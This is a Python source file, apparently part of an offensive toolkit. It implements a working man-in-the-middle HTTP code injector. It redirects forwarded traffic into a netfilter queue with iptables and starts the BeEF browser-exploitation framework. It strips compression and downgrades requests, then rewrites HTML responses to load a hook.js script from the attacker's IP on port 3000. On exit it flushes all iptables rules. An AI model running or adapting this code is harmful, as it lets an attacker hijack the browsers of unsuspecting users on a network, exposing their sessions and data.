#!/usr/bin/env python

try:
    import netfilterqueue as nf
    NETFILTERQUEUE_AVAILABLE = True
except ImportError:
    NETFILTERQUEUE_AVAILABLE = False

import scapy.all as scapy
import subprocess as sb
from src.logos.logo import Logo
from termcolor import colored
import time
import re
import os

class CodeInjector:
    def __init__(self):
        logo = Logo()
        logo.inject_logo()
        
        if not NETFILTERQUEUE_AVAILABLE:
            print(colored("\n[!] The netfilterqueue module is not available.", 'red'))
            print(colored("[!] This feature requires the netfilterqueue module to be installed.", 'yellow'))
            print(colored("[!] Please install it with: 'pip install netfilterqueue'", 'yellow'))
            print(colored("[!] Note: netfilterqueue may require additional system dependencies.", 'yellow'))
            input(colored("\nPress Enter to return to the main menu...", 'cyan'))
            return
            
        self.IP_Address = input(colored("\n[?] Insert your IP Address: ", 'yellow', attrs=['bold']))
        
        try:
            sb.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '0'])
            print(colored("\n[+] IPtables configured for forwarding traffic.", 'green'))
        except Exception as e:
            print(colored(f"\n[!] Error configuring IPtables: {str(e)}", 'red'))
            return
            
        try:
            sb.call(['beef-xss'])
            print(colored("\n[+] Beef-XSS started. \n", 'green', attrs=['reverse']))
        except Exception as e:
            print(colored(f"\n[!] Error starting Beef-XSS: {str(e)}", 'red'))
            print(colored("[*] You may need to install BeEF with 'apt-get install beef-xss'", 'yellow'))
            
        print(colored("[+]", 'yellow') + " IP table is set. Injecting the code if HTTP request is found.\n")
        try:
            queue = nf.NetfilterQueue()
            queue.bind(0, self.process_packet)
            queue.run()
        except KeyboardInterrupt:
            print("[-] Detected CTRL + C ... Resetting IPtables")
            sb.call(['iptables', '--flush'])
            print('[+] IPtables Flushed successfully :)')
        except Exception as e:
            print(colored(f"[!] Error: {str(e)}", 'red'))
            print(colored("[!] You may need to install netfilterqueue with 'pip install netfilterqueue'", 'yellow'))
        
    def set_load(self, packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def process_packet(self, packet):
        try:
            scapy_packet = scapy.IP(packet.get_payload())
            if scapy_packet.haslayer(scapy.Raw):
                load = scapy_packet[scapy.Raw].load.decode(errors='ignore')
                if scapy_packet[scapy.TCP].dport == 80:
                    print(colored('[+] Request!', 'yellow'))
                    load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
                    load = load.replace("HTTP/1.1", "HTTP/1.0")
                elif scapy_packet[scapy.TCP].sport == 80:
                    print(colored('[+] Response!', 'green'))
                    injection_code = '<script src="http://' + self.IP_Address + ':3000/hook.js"></script>'
                    load = load.replace("</body>", injection_code + "</body>")
                    content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
                    if content_length_search and "text/html" in load:
                        content_length = content_length_search.group(1)
                        new_content_length = int(content_length) + len(injection_code)
                        load = load.replace(content_length, str(new_content_length))
                
                if load != scapy_packet[scapy.Raw].load.decode(errors='ignore'):
                    new_packet = self.set_load(scapy_packet, load.encode())
                    packet.set_payload(bytes(new_packet))
                
            packet.accept()
        except AttributeError as e:
            print(colored(f"[!] Attribute Error: {str(e)}", 'yellow'))
            packet.accept()
        except IndexError as e:
            print(colored(f"[!] Index Error: {str(e)}", 'yellow'))
            packet.accept()
        except UnicodeDecodeError:
            print(colored("[!] Encrypted Request!", 'yellow'))
            packet.accept()
        except KeyboardInterrupt:
            print(colored("[!] CTRL + C Detected. Exiting the program.", "red"))
            sb.call(['iptables', '--flush'])
            exit() 